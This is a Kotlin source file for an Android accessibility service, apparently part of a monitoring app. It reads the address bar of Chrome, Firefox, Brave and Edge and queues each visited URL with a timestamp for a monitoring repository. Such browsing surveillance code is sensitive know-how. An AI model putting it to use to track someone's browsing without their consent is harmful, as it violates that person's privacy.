package com.lamda94.sara_mobile.monitoring

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import org.json.JSONObject

class SaraAccessibilityService : AccessibilityService() {

    private var lastUrl = ""
    private var lastUrlTime = 0L
    private val DEBOUNCE_MS = 2000L

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val pkg = event.packageName?.toString() ?: return
        if (!isBrowser(pkg)) return

        val now = System.currentTimeMillis()
        if (now - lastUrlTime < DEBOUNCE_MS) return

        val url = extractUrl(pkg, rootInActiveWindow) ?: return
        if (url == lastUrl || url.length < 8) return

        lastUrl = url
        lastUrlTime = now

        val ev = JSONObject().apply {
            put("browser_package", pkg)
            put("url", url)
            put("visited_at", now)
        }
        MonitoringRepository.enqueueBrowserEvent(applicationContext, ev)
    }

    override fun onInterrupt() {}

    private fun isBrowser(pkg: String) = pkg in setOf(
        "com.android.chrome", "org.mozilla.firefox",
        "com.brave.browser", "com.microsoft.emmx"
    )

    private fun extractUrl(pkg: String, root: AccessibilityNodeInfo?): String? {
        root ?: return null
        // Buscar nodo de barra de URL por viewId conocido
        val urlBarId = when (pkg) {
            "com.android.chrome" -> "$pkg:id/url_bar"
            "org.mozilla.firefox" -> "$pkg:id/mozac_browser_toolbar_url_view"
            "com.brave.browser" -> "$pkg:id/url_bar"
            "com.microsoft.emmx" -> "$pkg:id/url_bar"
            else -> return null
        }
        val nodes = root.findAccessibilityNodeInfosByViewId(urlBarId)
        val url = nodes?.firstOrNull()?.text?.toString()
        nodes?.forEach { it.recycle() }
        return url
    }
}
